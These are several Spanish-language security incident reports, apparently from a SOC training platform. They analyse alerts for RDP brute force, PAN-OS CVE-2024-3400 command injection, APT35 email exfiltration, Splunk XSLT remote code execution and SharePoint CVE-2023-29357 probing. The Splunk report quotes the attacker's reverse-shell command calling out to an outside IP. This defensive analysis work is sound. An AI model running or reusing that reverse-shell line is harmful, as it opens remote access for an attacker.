## Informe de Incidente - Evento 234

### 1.a Memoria del Trabajo Realizado

- **Tipo según Taxonomía:** Brute Force
- **Criticidad:** Media
- **Descripción del Incidente:** Se detectó un intento de ataque de fuerza bruta a través del protocolo RDP desde la dirección IP 218.92.0.56 hacia el host Matthew (IP: 172.16.17.148). El ataque consistió en intentos de inicio de sesión fallidos desde una sola fuente con diferentes cuentas no existentes.

![Diagrama de Ataque](URL_DEL_DIAGRAMA)

### 1.b Proceso de Investigación

Para determinar si el ataque de fuerza bruta fue exitoso, se revisaron los registros de auditoría de SSH/RDP:

- Para Windows:
  - Se verificaron los eventos del Event ID 4625: "An account failed to log on".

- Para Linux:
  - Se ejecutaron los comandos `cat /var/log/auth.log | grep "Failed password"`.

Tras revisar los registros, se concluyó que el ataque no fue exitoso, ya que no se encontraron registros de un inicio de sesión exitoso después de una serie de intentos fallidos desde la misma dirección IP y hacia el mismo destino.

### 2.a Actuación para el Restablecimiento de Servicios

Dado que el ataque no tuvo éxito, no fue necesario realizar ninguna acción para restablecer servicios afectados.

### 3.a Acciones Destacadas y Análisis de Actuaciones

- Se monitorearon los registros de auditoría para detectar cualquier actividad adicional.
- Se llevó a cabo un análisis exhaustivo de los intentos de inicio de sesión fallidos para identificar patrones o comportamientos sospechosos.
- Se registraron las lecciones aprendidas, incluyendo la importancia de tener medidas de seguridad robustas para evitar ataques de fuerza bruta.

### 3.b Registro de Lecciones Aprendidas y Mejoras Propuestas

- **Lecciones Aprendidas:**
  - La importancia de contar con políticas de seguridad robustas para contraseñas, como el uso de contraseñas fuertes y la implementación de bloqueos después de varios intentos fallidos.
  - La necesidad de monitorear de cerca los registros de auditoría para detectar y responder rápidamente a posibles ataques.

- **Mejoras Propuestas:**
  - Reforzar las políticas de seguridad de contraseñas en todos los sistemas, incluyendo la implementación de bloqueos automáticos después de un número determinado de intentos fallidos.
  - Mejorar la capacidad de monitoreo y respuesta a incidentes para detectar y mitigar ataques de fuerza bruta de manera más efectiva.

### 4.a Actuaciones para Evitar Repetición

- Reforzar las políticas de seguridad de contraseñas, incluyendo la implementación de políticas de bloqueo de cuentas después de un número específico de intentos fallidos.
- Implementar sistemas de detección de intrusiones para detectar y responder rápidamente a posibles ataques de fuerza bruta en el futuro.



-----

## Informe de Incidente - Evento 249

### Entendiendo la Activación de la Alerta

- **Tipo de Evento:** Explotación de Vulnerabilidad de Inyección de Comandos en Palo Alto Networks PAN-OS (CVE-2024-3400)
- **Dispositivos Implicados:** Se detectó tráfico desde la dirección IP de origen 144.172.79.92 (Puerto de Origen: 51232) hacia la dirección IP de destino 172.16.17.139 (Puerto de Destino: 20077).
![AlarmaActivada](image.png)



### Recopilación de Datos

#### Tráfico Proveniente de Internet

- **Propósito del Tráfico:** Se identificó un intento de conexión HTTP POST desde la dirección IP 144.172.79.92 hacia el recurso /global-protect/login.esp en la dirección IP 172.16.17.139.
- **Contenido del Tráfico:** Se observó una cookie inusual en la solicitud HTTP, que parecía estar manipulada para explotar una vulnerabilidad de inyección de comandos en el software PAN-OS.

### Determinando la Malicia

- **Análisis de la Solicitud HTTP:** La solicitud HTTP POST contenía una cookie modificada que incluía un comando `curl` que apuntaba a la dirección IP 144.172.79.92 en el puerto 4444, lo que indica un intento de explotar la vulnerabilidad conocida.
![Cual es tipo de ataque](image-2.png)

Viendo en virus total se encontro que era maliciosa.
![virustotal](image-4.png)



Se concluye que el trafico era malicioso:
![TraficoMalicioso](image-1.png)

### Verificando si se Trata de Pruebas Planeadas

- **Pruebas de Penetración:** No se encontraron registros ni indicaciones de que este tráfico malicioso fuera parte de una prueba de penetración planeada.
- **Productos de Simulación de Ataques:** El tráfico no parece ser el resultado de productos de simulación de ataques conocidos.


### ¿Fue Exitoso el Ataque?

- **Resultados del Ataque:** Aunque se detectó un intento de explotación, no se encontraron pruebas de que el ataque haya tenido éxito. No se observaron cambios significativos en el funcionamiento del sistema afectado.


### Artefactos

![artefactos](image-3.png)


### Acciones Recomendadas

- **Monitoreo Continuo:** Se recomienda monitorear de cerca el tráfico entrante y saliente para detectar y prevenir futuros intentos de explotación.
- **Actualizaciones de Seguridad:** Es importante mantener el software PAN-OS actualizado con los últimos parches de seguridad para mitigar vulnerabilidades conocidas.

---



## Informe de Incidente - Evento 212

### Identificación del Incidente

- **Descripción:** APT35, también conocido como Charming Kitten, ha sido observado utilizando una nueva herramienta llamada Hyperscrape para extraer correos electrónicos de las bandejas de entrada de sus víctimas.
- **EventID:** 212
- **Hora del Evento:** 27 de Diciembre de 2023, 11:22 AM
- **Regla Detectada:** SOC250 - APT35 HyperScrape Data Exfiltration Tool Detected
- **Nivel de Alerta:** Analista de Seguridad
- **Hostname:** Arthur
- **Dirección IP:** 172.16.17.72
- **Nombre del Proceso:** EmailDownloader.exe
- **Ruta del Proceso:** C:\Users\LetsDefend\Downloads\EmailDownloader.exe
- **Proceso Padre:** C:\Windows\Explorer.EXE
- **Línea de Comando:** C:\Users\LetsDefend\Downloads\EmailDownloader.exe
- **Hash del Archivo:** cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa
- **Razón de Activación:** Se identificaron patrones de comportamiento inusual o sospechoso vinculados al hash del archivo, indicando una posible intención maliciosa.
- **Acción del Dispositivo:** Permitida

### Registros de Interés

#### Primer Evento

- **Tipo:** OS
- **Dirección IP de Origen:** 172.16.17.72
- **Puerto de Origen:** 0
- **Dirección IP de Destino:** 172.16.17.72
- **Puerto de Destino:** 0
- **Hora:** 27 de Diciembre de 2023, 11:17 AM
- **Registro Crudo:**
  - **Usuario:** Arthur
  - **ID de Evento:** 4624 (Se ha iniciado sesión correctamente una cuenta)
  - **Tipo de Inicio de Sesión:** 10
  - **IP de Origen:** 173.209.51.54

#### Segundo Evento

- **Tipo:** Firewall
- **Dirección IP de Origen:** 172.16.17.72
- **Puerto de Origen:** 24234
- **Dirección IP de Destino:** 136.243.108.14
- **Puerto de Destino:** 80
- **Hora:** 27 de Diciembre de 2023, 11:22 AM
- **Registro Crudo:**
  - **IP de Origen:** 172.16.17.72
  - **IP de Destino:** 136.243.108.14
  - **Puerto de Destino:** 80
  - **Proceso de Origen:** EmailDownloader.exe
  - **Acción del Firewall:** ÉXITO

### Análisis del Incidente

#### Tipo de ataque:

- Tipo de Ataque: Exfiltración de Datos

El incidente implica la detección de una herramienta de exfiltración de datos llamada Hyperscrape, utilizada por el grupo APT35 (Charming Kitten), para extraer correos electrónicos de las bandejas de entrada de las víctimas. Esta acción se alinea con el objetivo de robo de información confidencial y su posterior transferencia desde el sistema comprometido hacia un servidor controlado por el atacante. La detección de este tipo de actividad maliciosa constituye un grave riesgo para la seguridad de la información y puede resultar en pérdidas significativas para la organización afectada.

![tipo](image-5.png)

#### Reconocimiento

El ataque coincide con técnicas de reconocimiento, específicamente la extracción de correos electrónicos utilizando la herramienta Hyperscrape.

#### Alcance

Se necesita determinar qué otros sistemas pueden estar afectados. No se encontraron evidencias de más de un dispositivo afectado hasta el momento.

#### Contención

Se recomienda aislar el dispositivo afectado para reducir el impacto del ataque.

#### Lecciones Aprendidas

- El ataque ocurrió a través de la herramienta Hyperscrape, utilizada por APT35.
- El personal y la gestión respondieron adecuadamente al incidente al detectar y registrar el comportamiento inusual.
- Se deben implementar medidas preventivas, como la actualización de sistemas y la capacitación del personal en seguridad cibernética, para evitar incidentes similares en el futuro.
- Se debe monitorear de cerca los comportamientos inusuales en los registros de seguridad para detectar y prevenir futuros incidentes.

### Artefactos

![alt text](image-6.png)

- **Hash del Archivo:** cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa

- **Dirección IP de Origen:** 172.16.17.72

- **Proceso de Origen:** EmailDownloader.exe



## Informe de Incidente - Evento 201

---

### Identificación del Incidente

- **Descripción:** Se detectó una ejecución remota de código en Splunk Enterprise a través de la carga de archivos maliciosos utilizando XSLT por parte de un usuario no autorizado.
- **EventID:** 201
- **Hora del Evento:** Noviembre 21, 2023, 12:24 PM
- **Regla Detectada:** SOC239 - Remote Code Execution Detected in Splunk Enterprise
- **Nivel de Alerta:** Analista de Seguridad
- **Hostname:** Splunk Enterprise
- **Dirección IP de Origen:** 180.101.88.240
- **Dirección IP de Destino:** 172.16.20.13
- **HTTP Request Method:** POST
- **URL Solicitada:** http://18.219.80.54:8000/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl
- **Ruta del Archivo Disparador:** /opt/splunk/var/run/splunk/dispatch/1700556926.3/shell.xsl
- **Razón de Activación:** Se detectó una carga de archivos XSLT maliciosos en Splunk Enterprise con el potencial de desencadenar una ejecución remota de código.
- **Acción del Dispositivo:** Permitida

### Análisis del Incidente

#### Tipo de Ataque: Ejecución Remota de Código mediante xml (RCE)

El incidente implica la ejecución remota de código en Splunk Enterprise mediante la carga de archivos maliciosos utilizando XSLT por parte de un usuario no autorizado. Esta acción puede resultar en un compromiso significativo de la seguridad de la plataforma Splunk y poner en riesgo la integridad y confidencialidad de los datos.

#### Evaluación de Artefactos

Se encontraron dos archivos asociados al incidente:

- **shell.sh:** Contiene el siguiente comando: `sh -i >& /dev/tcp/180.101.88.240/1923 0>&1`, lo que indica un intento de establecer una conexión de shell inversa.
- **shell.xsl:** Contiene código XSLT diseñado para realizar una inyección XML externa (XXE), específicamente un ataque de inyección de entidad externa XML.

#### Evaluación de Logs

Se recopilaron registros de firewall y proxy que muestran la interacción entre las direcciones IP y puertos involucrados en el incidente. Estos registros confirman la comunicación entre el origen malicioso y el destino en la infraestructura de Splunk Enterprise.

#### Evaluación de IP

La dirección IP de origen (180.101.88.240) se identificó como maliciosa por múltiples proveedores de seguridad. Perteneciente a la red de la empresa China Telecom, su reputación indica un alto riesgo de actividad maliciosa.
![ip](image-7.png)

#### Éxito del Ataque

Dado que la acción del dispositivo fue permitida y se detectó una carga de archivos maliciosos exitosa, se determina que el ataque fue exitoso. La ejecución remota de código pudo haber comprometido la seguridad de Splunk Enterprise.

### Contención y Recomendaciones

- **Aislamiento del Dispositivo:** Se recomienda aislar el dispositivo afectado para evitar una mayor propagación del ataque y para investigar a fondo el alcance del compromiso.
- **Revisión de Políticas de Seguridad:** Se deben revisar y fortalecer las políticas de seguridad de Splunk Enterprise para prevenir futuros incidentes de ejecución remota de código.
- **Notificación de Escalón de Nivel 2:** Dado el éxito del ataque, se requiere una notificación al equipo de Escalón de Nivel 2 para una evaluación más detallada y medidas de respuesta adicionales.





## **Informe de Incidente - SOC227: Posible Explotación de CVE-2023-29357 en Microsoft SharePoint Server**

**Resumen del Incidente:**
- **Evento:** SOC227 - Microsoft SharePoint Server Elevation of Privilege - Possible CVE-2023-29357 Exploitation
- **Fecha y Hora:** Oct, 06, 2023, 08:05 PM (UTC)
- **Nivel:** Analista de Seguridad
- **Hostname:** MS-SharePointServer
- **IP de Origen:** 39.91.166.222
- **IP de Destino:** 172.16.17.233
- **Método de Solicitud:** GET
- **URL Solicitada:** /_api/web/siteusers
- **User-Agent:** python-requests/2.28.1
- **Acción del Dispositivo:** Permitido
- **Taxonomía:** Web Attack
- **Criticidad:** Crítica

### **Descripción del Incidente:**
- Se detectó un posible intento de explotar la vulnerabilidad CVE-2023-29357 en Microsoft SharePoint Server.
- La solicitud GET a la API de SharePoint (`/_api/web/siteusers`) desde la IP de origen 39.91.166.222 generó una respuesta exitosa (código de estado 200).
- Sin embargo, se observó una segunda solicitud a una ruta no válida (`/_api/web/siteusers/web/siteusers`), lo que resultó en un código de estado 404 (No Encontrado).

### **Análisis:**
- La primera solicitud parece ser legítima y busca obtener información de usuarios del sitio desde la API de SharePoint.
- La segunda solicitud a una ruta inexistente podría indicar un intento de acceso malicioso o exploración por parte del mismo IP.
- Este comportamiento podría ser indicativo de una posible exploración en busca de vulnerabilidades o intentos de acceso no autorizados.

**Registros del Log:**

```
39.91.166.222 - - [06/Oct/2023:20:05:06 +0000] "GET /_api/web/siteusers HTTP/1.1" 200 1453 "-" "python-requests/2.28.1"
39.91.166.222 - - [06/Oct/2023:20:05:06 +0000] "GET /_api/web/siteusers/web/siteusers HTTP/1.1" 404 1453 "-" "python-requests/2.28.1"
```
![Ip](image-8.png)

Virustotal la identifica como maliciosa.

**¿Es el tráfico malicioso causado por una prueba planificada?**

No hay indicaciones en los registros de actividad que sugieran que el tráfico malicioso sea el resultado de una prueba planificada. Se recomienda una investigación adicional para determinar la naturaleza exacta del incidente.

**¿Cuál es la dirección del tráfico?**

El tráfico malicioso se dirige desde la IP de origen 39.91.166.222 al destino 172.16.17.233.

**¿Se logró el ataque?**

Dado que la primera solicitud recibió una respuesta exitosa (código de estado 200), es posible que el atacante haya obtenido información sobre los usuarios del sitio. Sin embargo, la segunda solicitud resultó en un código de estado 404, lo que indica que la ruta solicitada no fue encontrada. Se necesita una investigación adicional para determinar si el ataque fue exitoso en su totalidad. Por ende se mandaria al tier 2.


**Acciones Recomendadas:**
- Investigar más a fondo el origen y la naturaleza de la segunda solicitud para determinar la intención del atacante.
- Evaluar si el servidor de SharePoint está parcheado y protegido contra la vulnerabilidad CVE-2023-29357.
- Monitorizar y registrar actividades sospechosas o maliciosas en el servidor para detectar y prevenir posibles ataques futuros.
